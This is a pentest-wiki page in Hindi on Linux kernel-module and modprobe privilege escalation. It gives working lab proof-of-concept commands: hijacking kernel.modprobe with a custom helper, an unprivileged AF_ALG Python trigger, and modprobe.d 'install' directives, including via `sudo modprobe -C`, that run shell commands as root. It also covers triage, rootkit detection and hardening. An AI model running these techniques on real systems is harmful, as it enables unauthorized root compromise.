# Kernel Modules और modprobe का दुरुपयोग

{{#include ../../banners/hacktricks-training.md}}

## Kernel module और module-loading misconfigurations

Linux privilege escalation review के दौरान Kernel module support एक high-impact क्षेत्र है। हर unsigned-module संदेश को अपने आप में exploitable न मानें, बल्कि इसका इस्तेमाल व्यावहारिक सवालों के जवाब पाने के लिए करें।<sup>[[1]](#references)[[2]](#references)[[3]](#references)[[8]](#references)[[9]](#references)[[10]](#references)</sup>

- क्या मौजूदा user `sudo`, capabilities या writable helper path के ज़रिए modules load कर सकता है?
- क्या module loading अब भी enabled है?
- क्या module signature enforcement disabled है?
- क्या module directories, module files या `modprobe.d` configuration paths writable हैं?<sup>[[16]](#references)</sup>
- क्या यह पुष्टि करने के लिए कि क्या हुआ, kernel logs पढ़े जा सकते हैं?

त्वरित triage की शुरुआत नीचे दिए गए module-status, signature, logging और module-tree checks से करें।<sup>[[1]](#references)[[2]](#references)[[6]](#references)[[8]](#references)</sup>

```bash
uname -a
uname -r
cat /proc/sys/kernel/modules_disabled 2>/dev/null
grep -Eo '(^| )module\.sig_enforce(=[^ ]*)?' /proc/cmdline 2>/dev/null
grep -E '^(CONFIG_STATIC_USERMODEHELPER|CONFIG_STATIC_USERMODEHELPER_PATH)=' "/boot/config-$(uname -r)" 2>/dev/null
grep -E '^(CONFIG_MODULE_SIG|CONFIG_MODULE_SIG_FORCE)=' "/boot/config-$(uname -r)" 2>/dev/null
cat /proc/sys/kernel/dmesg_restrict 2>/dev/null
dmesg 2>/dev/null | grep -Ei 'module|signature|taint|verification'
find /lib/modules/$(uname -r) -type d -writable -ls 2>/dev/null
find /lib/modules/$(uname -r) -type f -name '*.ko*' -writable -ls 2>/dev/null
```

व्याख्या:

- `modules_disabled=1` का अर्थ है कि modules को न तो load किया जा सकता है और न ही unload; reboot होने तक इसका मान `0` पर रीसेट नहीं किया जा सकता।<sup>[[1]](#references)</sup>
- Kernel command line में `module.sig_enforce=1` या `CONFIG_MODULE_SIG_FORCE=y` होने पर modules का वैध रूप से signed होना आवश्यक है; अन्यथा, unsigned modules load हो सकते हैं और kernel को taint कर सकते हैं।<sup>[[2]](#references)</sup>
- `dmesg_restrict=0` होने पर `dmesg` पर कोई पाबंदी नहीं होती; इसका मान `1` होने पर access के लिए `CAP_SYSLOG` आवश्यक है।<sup>[[1]](#references)</sup>
- `/lib/modules/$(uname -r)/` के अंतर्गत writable paths खतरनाक हैं, क्योंकि modules load करते समय `modprobe` उस tree और उसकी dependency data में खोज करता है।<sup>[[8]](#references)</sup>

### Module load करना और kernel output पढ़ना

यदि आपके पास किसी local module को load करने की वैध अनुमति है, तो `insmod` आपके दिए गए सटीक `.ko` file को insert करता है। Load के दौरान module का init function चलता है और `printk()` से लिखे गए messages kernel log buffer में जाते हैं, जिसे आम तौर पर `dmesg` से पढ़ा जाता है।<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[6]](#references)</sup>

एक न्यूनतम review workflow में metadata की जाँच के लिए `modinfo`, module load और remove करने के लिए `insmod` और `rmmod`, loaded state की पुष्टि के लिए `lsmod`, और kernel logs की जाँच के लिए `dmesg` का उपयोग किया जाता है।<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
ls -l ./example.ko
modinfo ./example.ko 2>/dev/null
sudo insmod ./example.ko
lsmod | grep -i example
dmesg | tail -n 30
sudo rmmod example
dmesg | tail -n 30
```

यदि `sudo -l` में `insmod`, `modprobe` या इनके किसी wrapper को चलाने की अनुमति हो, तो इसे critical मानें: `sudo -l` इसे चलाने वाले user के privileges सूचीबद्ध करता है, और kernel module load करने के लिए `CAP_SYS_MODULE` आवश्यक है। सीधे capability-based paths के लिए [Linux capabilities](../interesting-files-permissions/linux-capabilities.md#cap_sys_module) देखें।<sup>[[3]](#references)[[9]](#references)[[10]](#references)</sup>

```bash
sudo -l
sudo /sbin/insmod ./example.ko
```

### `insmod` चलाने की sudo अनुमति

ऐसा sudo नियम, जो किसी उपयोगकर्ता को `insmod` चलाने की अनुमति देता है, किसी सामान्य प्रशासनिक सहायक को चलाने की अनुमति देने जैसा नहीं है। मॉड्यूल का initialization code उसे insert करने की प्रक्रिया के हिस्से के रूप में चलता है, इसलिए व्यावहारिक समीक्षा का प्रश्न यह है कि क्या यह उपयोगकर्ता लोड किए जा रहे मॉड्यूल को चुन या संशोधित कर सकता है।<sup>[[3]](#references)</sup>

निम्नलिखित सामान्य समीक्षा प्रक्रिया किसी संभावित मॉड्यूल के लिए निरीक्षण, लोड, स्थिति, लॉग और हटाने की जाँचों को दोहराती है।<sup>[[4]](#references)[[6]](#references)[[12]](#references)[[13]](#references)[[14]](#references)</sup>

```bash
sudo -l
ls -l ./candidate.ko
modinfo ./candidate.ko 2>/dev/null
sudo /sbin/insmod ./candidate.ko
lsmod | grep -i candidate
dmesg | tail -n 30
sudo /sbin/rmmod candidate
```

यदि user कोई भी मनमाना `.ko` दे सकता है, तो authorized assessment में इस नियम को पूरे system से compromise के समान मानना चाहिए। अधिक सुरक्षित operational pattern यह है कि sudo के माध्यम से module loading का अधिकार न सौंपें; यदि यह अपरिहार्य हो, तो सटीक path, ownership, permissions, signing policy और removal workflow को प्रतिबंधित करें।<sup>[[3]](#references)[[10]](#references)</sup>

नियंत्रित lab में module बनाने के एक हानिरहित pattern के लिए, नीचे न्यूनतम source और Makefile दिखाए गए हैं; `make -C /lib/modules/$(uname -r)/build M=$PWD` वाला तरीका external modules के लिए kernel के documented kbuild workflow का पालन करता है।<sup>[[5]](#references)[[7]](#references)</sup>

```c
#include <linux/module.h>
#include <linux/kernel.h>

static int __init demo_init(void) {
    printk(KERN_INFO "demo module loaded\n");
    return 0;
}

static void __exit demo_exit(void) {
    printk(KERN_INFO "demo module unloaded\n");
}

module_init(demo_init);
module_exit(demo_exit);
MODULE_LICENSE("GPL");
```

```makefile
obj-m += demo.o

all:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
	make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

केवल अधिकृत लैब में build और load करें; kbuild external module बनाता है, और load/remove commands kernel module interfaces को invoke करते हैं।<sup>[[3]](#references)[[4]](#references)[[5]](#references)[[7]](#references)</sup>

```bash
make
sudo insmod demo.ko
dmesg | tail -n 20
sudo rmmod demo
```

### `kernel.modprobe` / `modprobe_path` के दुरुपयोग की जाँच

`kernel.modprobe` उस userspace helper का नाम बताता है जिसे kernel, module autoload अनुरोधों के लिए चलाता है; यह sysctl autoloading को प्रभावित करता है, स्पष्ट रूप से module insert करने को नहीं। अगर कोई attacker इसे ऐसे executable path पर सेट कर सके जिस पर उसे लिखने की अनुमति हो, और module अनुरोध ट्रिगर कर सके, तो वह helper privileged code execution का रास्ता बन जाता है। इसे खाली string पर सेट करने से autoload अनुरोध अक्षम हो जाते हैं; अगर `CONFIG_STATIC_USERMODEHELPER=y` है, तो non-empty value को compiled-in static helper path से बदल दिया जाता है।<sup>[[1]](#references)</sup>

Kernel sysctl interface के ज़रिए मौजूदा helper path जाँचें और target का ownership तथा mode देखें।<sup>[[1]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe 2>/dev/null
sysctl kernel.modprobe 2>/dev/null
ls -l "$(cat /proc/sys/kernel/modprobe 2>/dev/null)" 2>/dev/null
```

जाँचें कि sysctl, delegated sudo rules, या file capabilities को प्रभावित किया जा सकता है या नहीं।<sup>[[1]](#references)[[9]](#references)[[10]](#references)[[15]](#references)</sup>

```bash
ls -l /proc/sys/kernel/modprobe
sudo -l | grep -E 'sysctl|tee|bash|sh|modprobe'
getcap -r / 2>/dev/null | grep -E 'cap_sys_admin|cap_sys_module'
```

निम्न lab-only पैटर्न helper path बदलता है और documented module-autoload request trigger करता है; इसका उपयोग केवल isolated, authorized system पर करें।<sup>[[1]](#references)</sup>

वर्तमान Linux kernels पर, किसी unknown executable का generic trigger के रूप में उपयोग न करें: legacy custom binary-format module autoloading को Linux 6.14 में हटा दिया गया था, जबकि kernel documentation में unknown filesystem type को module-autoload request path बताया गया है।<sup>[[1]](#references)[[11]](#references)</sup>

```bash
# Example only: requires permission to write kernel.modprobe
printf '#!/bin/sh\nid > /tmp/modprobe-helper-ran\n' > /tmp/helper
chmod +x /tmp/helper
echo /tmp/helper | sudo tee /proc/sys/kernel/modprobe

# Trigger a documented module-autoload request (requires mount privilege)
sudo mount -t definitely-not-a-filesystem none /mnt 2>/dev/null || true
cat /tmp/modprobe-helper-ran 2>/dev/null
```

Hardened systems पर, जब permissions unprivileged writes को `kernel.modprobe` में रोकती हैं, helper path writable नहीं होता, या module autoloading disabled होती है, तो यह विफल होना चाहिए।<sup>[[1]](#references)</sup>

### Unprivileged AF_ALG autoload trigger

ऊपर दिया गया filesystem trigger privileged `mount` का उपयोग करता है।<sup>[[1]](#references)</sup> जहाँ AF_ALG sockets उपलब्ध हैं, वहाँ unprivileged caller जानबूझकर ऐसे type से socket bind कर सकता है जो मौजूद नहीं है।<sup>[[17]](#references)[[18]](#references)</sup> इसके बाद `alg_bind()` `request_module()` के ज़रिए `algif-<type>` का अनुरोध करता है, जो configured module helper को invoke करता है।<sup>[[17]](#references)[[18]](#references)[[19]](#references)</sup> Linux 6.14 में legacy unknown-binary-format autoloading हटाए जाने के बाद भी यह काम करता है।<sup>[[11]](#references)[[17]](#references)</sup> `bind()` का विफल होना अपेक्षित है, क्योंकि type मौजूद नहीं है; socket के return value के बजाय helper के side effect की जाँच करें।<sup>[[17]](#references)[[18]](#references)</sup>

किसी authorized lab में, पहले controlled helper या `modprobe.d` rule तैयार करें, फिर `sudo` या `CAP_SYS_MODULE` के बिना एक अनुरोध trigger करें।<sup>[[17]](#references)[[18]](#references)</sup> Python 3.6+ AF_ALG `(type, name)` bind tuple स्वीकार करता है।<sup>[[20]](#references)</sup>

```bash
cat /proc/sys/kernel/modprobe
cat /proc/sys/crypto/af_alg_restrict 2>/dev/null
python3 - <<'PYCODE'
import socket
with socket.socket(socket.AF_ALG, socket.SOCK_SEQPACKET, 0) as s:
    try:
        s.bind(("htprobe", "unused"))
    except OSError as exc:
        print(f"bind returned: {exc}")
PYCODE
```

इस path के लिए उपयोग करने योग्य AF_ALG socket और गैर-रिक्त `kernel.modprobe` आवश्यक हैं।<sup>[[1]](#references)[[18]](#references)</sup> `/proc/sys/crypto/af_alg_restrict` वाले kernels में, मान `2` AF_ALG socket बनाने को निष्क्रिय करता है; मान `1` algorithms को प्रतिबंधित करता है, लेकिन `alg_bind()` में missing-type request को नहीं रोकता।<sup>[[18]](#references)[[21]](#references)</sup> Helper के invoke होने से पहले कोई LSM module request को अस्वीकार कर सकता है।<sup>[[19]](#references)</sup>

### लिखने योग्य `modprobe.d` configuration और `sudo modprobe -C`

किसी module को resolve करने से पहले, `modprobe` precedence order में configuration directories—जैसे `/etc/modprobe.d`, `/run/modprobe.d`, `/usr/local/lib/modprobe.d`, `/usr/lib/modprobe.d`, और `/lib/modprobe.d`—से `.conf` files पढ़ता है। Higher-priority directory में मौजूद समान नाम वाली file, lower-priority file को shadow करती है। इससे भी महत्वपूर्ण बात यह है कि `install <module> <command>` directive उस module को insert **करने के बजाय** मनमाना shell command चलाता है। इसलिए, किसी लिखने योग्य configuration path के कारण, बाद में privileged `modprobe` caller के credentials के तहत delayed command execution हो सकता है; kernel module signature enforcement इस userspace command को authenticate नहीं करता।<sup>[[16]](#references)</sup>

Directory और file permissions का audit करें, फिर प्रभावी configuration का निरीक्षण करें। Resolution की समीक्षा के लिए `modprobe -n -v` सुरक्षित है, क्योंकि dry-run mode न तो module insert करता है और न ही `install`/`remove` command चलाता है। पुराने `--showconfig` spelling के बजाय `modprobe -c` का उपयोग करें; kmod के मौजूदा documentation में इसे kmod 36 के बाद हटाए जाने के लिए चिह्नित किया गया है।<sup>[[8]](#references)[[16]](#references)</sup>

```bash
for d in /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d /usr/lib/modprobe.d /lib/modprobe.d; do
    [ -e "$d" ] || continue
    find "$d" -maxdepth 1 -writable -ls 2>/dev/null
done

grep -RHE '^[[:space:]]*(install|remove|alias|blacklist)[[:space:]]' \
  /etc/modprobe.d /run/modprobe.d /usr/local/lib/modprobe.d \
  /usr/lib/modprobe.d /lib/modprobe.d 2>/dev/null
modprobe -c 2>/dev/null | grep -E '^(install|remove|alias|blacklist)[[:space:]]'
modprobe -n -v <module_name>
```

`modprobe` के लिए unrestricted `sudo` नियम का दुरुपयोग तब भी किया जा सकता है, जब arbitrary `.ko` files signature verification पास न कर सकें: `-C` attacker-controlled configuration directory चुनता है, जहाँ से sudo द्वारा लॉन्च की गई process `install` command चला सकती है।<sup>[[8]](#references)[[16]](#references)</sup>

```bash
# Authorized lab proof for an unrestricted `sudo modprobe` rule
D="$(mktemp -d)"
printf '%s\n' 'install ht_probe /bin/sh -c "id > /tmp/ht-modprobe-id"' > "$D/00-ht.conf"
sudo /sbin/modprobe -C "$D" ht_probe
cat /tmp/ht-modprobe-id
```

यदि kernel के helper को दिखाई देने वाली `modprobe.d` directory writable है, तो वही [AF_ALG autoload trigger](#unprivileged-af_alg-autoload-trigger) `modprobe` चलाने के लिए administrator का इंतज़ार किए बिना तुरंत `install algif-htprobe` directive चला सकता है।<sup>[[16]](#references)[[18]](#references)[[19]](#references)</sup> किसी अधिकृत lab में, writable `.conf` में एक harmless marker command रखें, `modprobe -n -v algif-htprobe` से resolution की पुष्टि करें, और फिर ऊपर दिया गया trigger चलाएँ।<sup>[[8]](#references)[[16]](#references)</sup> `modules_disabled=1` और module signature enforcement module insertion को रोकते हैं, इस userspace `install` command को नहीं; खाली `kernel.modprobe` या blocked AF_ALG path इस autoload route को रोकता है।<sup>[[1]](#references)[[2]](#references)[[16]](#references)[[18]](#references)[[19]](#references)</sup>

```bash
printf '%s\n' 'install algif-htprobe /bin/sh -c "id > /tmp/ht-modprobe-id"' > /etc/modprobe.d/zz-htprobe.conf
modprobe -n -v algif-htprobe
# Run the AF_ALG trigger above, then inspect /tmp/ht-modprobe-id.
```

Mitigation के लिए, `sudo` के ज़रिए argument-unrestricted `modprobe` की अनुमति न दें, सभी configuration directories को root-owned और non-writable रखें, और अप्रत्याशित `install`/`remove` directives की समीक्षा करें। जब किसी trusted administrative workflow को किसी एक module के लिए ऐसी directives को bypass करना आवश्यक हो, तो `modprobe --ignore-install` उस नामित module के लिए उन्हें अनदेखा करता है, लेकिन dependencies के अपने commands फिर भी हो सकते हैं।<sup>[[8]](#references)[[16]](#references)</sup>

### Writable `/lib/modules` की समीक्षा

Writable module directories से module replacement, malicious module planting या auto-load abuse हो सकता है—यह इस पर निर्भर करता है कि बाद में `modprobe` को कैसे invoke किया जाता है; `modprobe` `/lib/modules/$(uname -r)` में खोजता है और modules resolve करते समय उसका dependency data इस्तेमाल करता है।<sup>[[8]](#references)</sup>

Active kernel release की module tree के अंतर्गत मौजूद writable module files और dependency/alias metadata की समीक्षा करें।<sup>[[8]](#references)</sup>

```bash
KREL="$(uname -r)"
find "/lib/modules/$KREL" -type d -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f -name '*.ko*' -writable -ls 2>/dev/null
find "/lib/modules/$KREL" -type f \( -name 'modules.dep' -o -name 'modules.alias' -o -name 'modules.order' \) -writable -ls 2>/dev/null
```

यदि आपको लिखने योग्य मॉड्यूल सामग्री मिले, तो जाँचें कि `modprobe` निर्भरताओं को कैसे हल करता है और `modinfo` मॉड्यूल मेटाडेटा की रिपोर्ट कैसे करता है।<sup>[[8]](#references)[[12]](#references)</sup>

```bash
modprobe --show-depends <module_name> 2>/dev/null
modinfo <module_name> 2>/dev/null
grep -R "<module_name>" /lib/modules/$(uname -r)/modules.* 2>/dev/null
```

रक्षात्मक नोट्स:

- `/lib/modules` का स्वामित्व `root:root` के पास रखें और इसे उपयोगकर्ताओं के लिए लिखने योग्य न रखें।<sup>[[8]](#references)</sup>
- जहाँ संचालन की दृष्टि से संभव हो, boot के बाद `kernel.modules_disabled=1` सेट करें।<sup>[[1]](#references)</sup>
- उन सिस्टमों पर module signing लागू करें जिन्हें loadable modules की आवश्यकता होती है।<sup>[[2]](#references)</sup>
- `/proc/sys/kernel/modprobe`, `/lib/modules` और `modprobe.d` configuration directories में लिखने की गतिविधियों, साथ ही अप्रत्याशित `insmod`/`modprobe` execution की निगरानी करें।<sup>[[1]](#references)[[8]](#references)[[16]](#references)</sup>



## Module-आधारित rootkit triage

एक malicious module syscalls, VFS या `/proc` views, network paths या credential checks को hook करके processes और files छिपा सकता है, traffic redirect कर सकता है या secrets intercept कर सकता है। यह `lsmod` द्वारा दिखाई गई module list से खुद को हटा भी सकता है। Persistence `modprobe.d` aliases या install rules, `/etc/modules-load.d`, systemd unit, initramfs content या किसी legitimate `.ko` file को बदलने से आ सकती है। सामान्य `lsmod` परिणाम उपयोगी सबूत है, लेकिन kernel-level compromise, kernel द्वारा दी गई lists को अविश्वसनीय बना सकता है। Loaded modules, disk पर मौजूद files, boot configuration, module-load logs और trusted external telemetry का मिलान करें।

```bash
cat /proc/modules
lsmod
find /lib/modules/"$(uname -r)" -type f -name '*.ko*' -ls 2>/dev/null
grep -R -nE '^(install|softdep|blacklist|options) ' /etc/modprobe.d /run/modprobe.d /usr/lib/modprobe.d 2>/dev/null
find /etc/modules-load.d /usr/lib/modules-load.d -maxdepth 1 -type f -print 2>/dev/null
journalctl -k -b | grep -Ei 'module|taint|signature|lockdown'
cat /proc/sys/kernel/tainted
```

अप्रत्याशित module नामों, paths, dependencies, signatures और load times की जाँच करें। Kernel taint और unsigned-module संदेश संकेत हैं, rootkit का प्रमाण नहीं। यदि rootkit का संदेह हो, तो live kernel output पर भरोसा करने से पहले किसी विश्वसनीय image या recovery environment से साक्ष्य एकत्र करें। [kernel vulnerability assessment](kernel-vulnerability-assessment.md) पृष्ठ में configuration और diagnostic exposure की जानकारी है, जिसमें tracefs और pinned BPF objects शामिल हैं।



## References

- [1] [/proc/sys/kernel/ के लिए दस्तावेज़ — The Linux Kernel documentation](https://docs.kernel.org/admin-guide/sysctl/kernel.html)
- [2] [Kernel module signing सुविधा — The Linux Kernel documentation](https://www.kernel.org/doc/html/latest/admin-guide/module-signing.html)
- [3] [init_module(2) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man2/init_module.2.html)
- [4] [insmod(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/insmod.8.html)
- [5] [Driver की मूल बातें — The Linux Kernel documentation](https://docs.kernel.org/driver-api/basics.html)
- [6] [printk से संदेश लॉग करना — The Linux Kernel documentation](https://docs.kernel.org/core-api/printk-basics.html)
- [7] [External Modules बनाना — The Linux Kernel documentation](https://docs.kernel.org/kbuild/modules.html)
- [8] [modprobe(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/modprobe.8.html)
- [9] [sudo(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/sudo.8.html)
- [10] [capabilities(7) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [11] [Merge tag 'execve-v6.14-rc1' — torvalds/linux](https://github.com/torvalds/linux/commit/fadc3ed9ce1cd9ecc5c8be8875f7ec11ab3a7ebe)
- [12] [modinfo(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/modinfo.8.html)
- [13] [lsmod(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/lsmod.8.html)
- [14] [rmmod(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/rmmod.8.html)
- [15] [getcap(8) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [16] [modprobe.d(5) — Linux मैनुअल पृष्ठ](https://man7.org/linux/man-pages/man5/modprobe.d.5.html)
- [17] [modprobe_path Technique को फिर से सक्रिय करना: search_binary_handler() Patch पर काबू पाना — Theori](https://theori.io/blog/reviving-the-modprobe-path-technique-overcoming-search-binary-handler-patch)
- [18] [AF_ALG bind और module request — Linux kernel source](https://github.com/torvalds/linux/blob/master/crypto/af_alg.c)
- [19] [Module helper invocation — Linux kernel source](https://github.com/torvalds/linux/blob/master/kernel/module/kmod.c)
- [20] [socket — Python documentation](https://docs.python.org/3/library/socket.html)
- [21] [/proc/sys/crypto/ — Linux kernel documentation](https://docs.kernel.org/admin-guide/sysctl/crypto.html)
{{#include ../../banners/hacktricks-training.md}}
